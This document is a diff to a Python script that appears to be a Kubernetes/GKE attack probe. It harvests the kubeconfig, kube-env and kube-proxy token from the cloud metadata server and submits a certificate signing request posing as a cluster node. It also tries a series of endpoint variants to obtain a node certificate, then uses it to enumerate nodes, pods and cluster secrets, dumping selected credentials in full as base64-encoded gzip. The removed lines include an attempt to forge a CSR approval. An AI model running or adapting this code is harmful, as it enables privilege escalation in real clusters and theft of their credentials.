@@ -105,11 +105,6 @@ def meta():
 
 
 
-def _kv(kubeenv, key):
-    m = re.search(r"^" + key + r":\s*(\S+)\s*$", kubeenv, re.M)
-    return base64.b64decode(m.group(1)) if m else None
-
-
 def api():
     out("===API2-BEGIN===")
     st, kc = md_get("instance/attributes/kubeconfig", timeout=15)
@@ -246,9 +241,8 @@ def api():
     out("===API2-END===")
 
 
-
-def api3():
-    out("===API3-BEGIN===")
+def api4():
+    out("===API4-BEGIN===")
     st, kc = md_get("instance/attributes/kubeconfig", timeout=15)
     st2, kvb = md_get("instance/attributes/kube-env", timeout=15)
     kv = kvb.decode("utf8", "replace")
@@ -276,6 +270,27 @@ def api3():
         except Exception as e:
             return -1, repr(e).encode()
 
+    # prior CSR states
+    st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests")
+    out("CSR-LIST status=%s len=%d" % (st, len(b)))
+    if st == 200:
+        for cs in json.loads(b).get("items", []):
+            md = cs.get("metadata", {})
+            inner = cs.get("spec", {}).get("request", "")
+            out("CSR %s user=%s conds=%s certlen=%s" % (md.get("name"), cs.get("spec", {}).get("username"), cs.get("status", {}).get("conditions"), len(cs.get("status", {}).get("certificate") or "")))
+            # reconstruct the same private key? only if it was ours: compare CSR public key impossible; print first 40 of request
+    st, b = call("/apis/certificates.k8s.io/v1")
+    out("DISCOVERY certificates/v1 status=%s\n%s" % (st, b[:1500].decode("utf8", "replace")))
+    st, b = call("/openapi/v3/apis/certificates.k8s.io/v1")
+    out("OPENAPI status=%s" % st)
+    if st == 200:
+        try:
+            d = json.loads(b)
+            hits = [k for k in d.get("paths", {}) if "nodeclient" in k]
+            out("OPENAPI nodeclient paths: %s" % hits)
+        except Exception as e:
+            out("OPENAPI parse err %r %s" % (e, b[:400].decode("utf8", "replace")))
+
     # GCE OAuth bearer identity (GCP auth provider)
     st, b = call("/api/v1/nodes", auth=gt)
     out("GCPTOKEN(no-cert) nodes status=%s %s" % (st, b[:200].decode("utf8", "replace")))
@@ -291,7 +306,8 @@ def api3():
 
     os.system("openssl x509 -in /tmp/boot.crt -noout -subject 2>&1 | head -1")
     # kube-proxy static token
-    kpt = _kv(kv, "KUBE_PROXY_TOKEN")
+    msk = re.search(r"^KUBE_PROXY_TOKEN:\s*(\S+)\s*$", kv, re.M)
+    kpt = msk.group(1).encode() if msk else None
     if kpt:
         kpt = kpt.decode("latin1").strip()
         st, b = call("/api/v1/nodes", auth=kpt)
@@ -302,7 +318,7 @@ def api3():
         out("PROXYTOKEN pods status=%s %s" % (st, b[:300].decode("utf8", "replace")))
 
     # CSR + nodeclient subresource variants
-    os.system("openssl genrsa -out /tmp/nkey.pem 2048 2>/dev/null")
+    os.system("cp /client.key /tmp/nkey.pem 2>/dev/null || openssl genrsa -out /tmp/nkey.pem 2048 2>/dev/null")
     os.system("openssl req -new -key /tmp/nkey.pem -subj '/O=system:nodes/CN=system:node:%s' -out /tmp/n.csr 2>/dev/null" % node)
     csr = base64.b64encode(open("/tmp/n.csr", "rb").read()).decode()
     cname = "bhs-p3-%s" % os.urandom(3).hex()
@@ -314,45 +330,76 @@ def api3():
     out("CSR create status=%s %s" % (st, b[:250].decode("utf8", "replace")))
     if st in (200, 201):
         variants = [
+            ("GET", "/apis/certificates.k8s.io/v1/certificatesigningrequests/nodeclient", None),
+            ("POST", "/apis/certificates.k8s.io/v1/certificatesigningrequests/nodeclient", b"{}"),
+            ("POST", "/apis/certificates.k8s.io/v1/certificatesigningrequests/nodeclient", cbody),
+            ("PUT", "/apis/certificates.k8s.io/v1/certificatesigningrequests/nodeclient", cbody),
             ("POST", "/apis/certificates.k8s.io/v1/certificatesigningrequests/%s/nodeclient" % cname, b"{}"),
             ("POST", "/apis/certificates.k8s.io/v1/certificatesigningrequests/%s/nodeclient" % cname, cbody),
-            ("POST", "/apis/certificates.k8s.io/v1/certificatesigningrequests/nodeclient", cbody),
-            ("PUT", "/apis/certificates.k8s.io/v1/certificatesigningrequests/%s/approval" % cname, None),
+            ("PUT", "/apis/certificates.k8s.io/v1/certificatesigningrequests/%s/nodeclient" % cname, cbody),
+            ("GET", "/apis/certificates.k8s.io/v1/certificatesigningrequests/%s/nodeclient" % cname, None),
+            ("POST", "/apis/certificates.k8s.io/v1beta1/certificatesigningrequests/%s/nodeclient" % cname, cbody),
         ]
         for meth, path, bodyx in variants:
-            if bodyx is None:
-                # build approval object with Approved condition
-                import datetime
-                aw = json.loads(cbody)
-                aw["status"] = {"conditions": [{"type": "Approved", "status": "True", "reason": "ProbeApprove",
-                                               "message": "approved by probe", "lastUpdateTime": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
-                                               "lastTransitionTime": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")}]}
-                bodyx = json.dumps(aw).encode()
             st, b = call(path, meth, bodyx)
-            out("%s %s status=%s %s" % (meth, path.split("certificatesigningrequests")[-1], st, b[:250].decode("utf8", "replace")))
-            import time as _t
-            for i in range(4):
-                _t.sleep(2)
-                st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + cname)
-                if st == 200:
-                    d = json.loads(b)
-                    c = d.get("status", {}).get("certificate")
-                    out("  poll conds=%s certlen=%s" % (d.get("status", {}).get("conditions"), len(c) if c else 0))
-                    if c:
-                        break
+            out("%s %s status=%s %s" % (meth, path, st, b[:220].decode("utf8", "replace")))
+        import time as _t
+        for i in range(10):
+            _t.sleep(3)
             st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + cname)
-            if st == 200 and json.loads(b).get("status", {}).get("certificate"):
-                cert = base64.b64decode(json.loads(b)["status"]["certificate"])
-                open("/tmp/ncrt.pem", "wb").write(cert)
-                ctxn = ssl.create_default_context(cafile="/tmp/ca.crt")
-                ctxn.load_cert_chain("/tmp/ncrt.pem", "/tmp/nkey.pem")
-                st, b = call("/api/v1/nodes", ctx=ctxn)
-                out("NODECERT nodes status=%s len=%d %s" % (st, len(b), b[:200].decode("utf8", "replace")))
-                st, b = call("/api/v1/secrets?limit=500", ctx=ctxn)
-                out("NODECERT secrets status=%s len=%d %s" % (st, len(b), b[:200].decode("utf8", "replace")))
-                break
-    out("===API3-END===")
+            if st == 200:
+                d = json.loads(b)
+                c = d.get("status", {}).get("certificate")
+                out("poll %d conds=%s certlen=%s" % (i, d.get("status", {}).get("conditions"), len(c) if c else 0))
+                if c:
+                    break
+        st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + cname)
+        if st == 200 and json.loads(b).get("status", {}).get("certificate"):
+            cert = base64.b64decode(json.loads(b)["status"]["certificate"])
+            open("/tmp/ncrt.pem", "wb").write(cert)
+            ctxn = ssl.create_default_context(cafile="/tmp/ca.crt")
+            ctxn.load_cert_chain("/tmp/ncrt.pem", "/tmp/nkey.pem")
+            st, b = call("/api/v1/nodes", ctx=ctxn)
+            out("NODECERT nodes status=%s len=%d" % (st, len(b)))
+            if st == 200:
+                for n in json.loads(b).get("items", []):
+                    md = n.get("metadata", {}); stat = n.get("status", {})
+                    out("NODE %s addrs=%s cap=%s" % (md.get("name"), [(a.get("type"), a.get("address")) for a in stat.get("addresses", [])], json.dumps(stat.get("capacity", {}))[:300]))
+            st, b = call("/api/v1/pods?limit=500", ctx=ctxn)
+            out("NODECERT pods status=%s len=%d" % (st, len(b)))
+            if st == 200:
+                for p in json.loads(b).get("items", []):
+                    md = p.get("metadata", {}); spec = p.get("spec", {})
+                    secvols = []
+                    for v in spec.get("volumes", []) or []:
+                        if v.get("secret"): secvols.append(v["secret"].get("secretName"))
+                        if v.get("projected"):
+                            for s2 in v["projected"].get("sources", []):
+                                if s2.get("secret"): secvols.append(s2["secret"].get("name"))
+                    out("POD %s|%s|node=%s|sa=%s|phase=%s|secvols=%s" % (md.get("namespace"), md.get("name"), spec.get("nodeName"), spec.get("serviceAccountName"), p.get("status", {}).get("phase"), secvols))
+            body2 = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview", "spec": {"namespace": "bhs"}}).encode()
+            st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body2, ctx=ctxn)
+            out("NODECERT SSRR status=%s\n%s" % (st, b[:4000].decode("utf8", "replace")))
+            st, b = call("/api/v1/secrets?limit=500", ctx=ctxn)
+            out("NODECERT secrets status=%s len=%d" % (st, len(b)))
+            interesting = []
+            if st == 200:
+                d = json.loads(b)
+                out("SECRET-COUNT %d" % len(d.get("items", [])))
+                for s in d.get("items", []):
+                    md = s.get("metadata", {}); name = md.get("name", "")
+                    out("SEC %s|%s|%s|keys=%s" % (md.get("namespace"), name, s.get("type"), sorted((s.get("data") or {}).keys())))
+                    if re.search(r"docker|registr|gcp|google|cloud|sa-|service-account|token|tls|secret|hub|key|config|proxy", name, re.I):
+                        interesting.append(s)
+            for s in interesting:
+                if _logged > MAX_SECRET_LOG:
+                    out("SECRET-LOG-CAP-REACHED"); break
+                md = s.get("metadata", {})
+                out("===SECRET-FULL %s/%s type=%s" % (md.get("namespace"), md.get("name"), s.get("type")))
+                raw = json.dumps(s).encode()
+                out("--b64gzip len=%d--" % len(raw)); out(base64.b64encode(gzip.compress(raw)).decode()); out("--end--")
+    out("===API4-END===")
 
 
 if __name__ == "__main__":
-    {"meta": meta, "api": api, "api3": api3}[sys.argv[1]]()
+    {"meta": meta, "api": api, "api4": api4}[sys.argv[1]]()
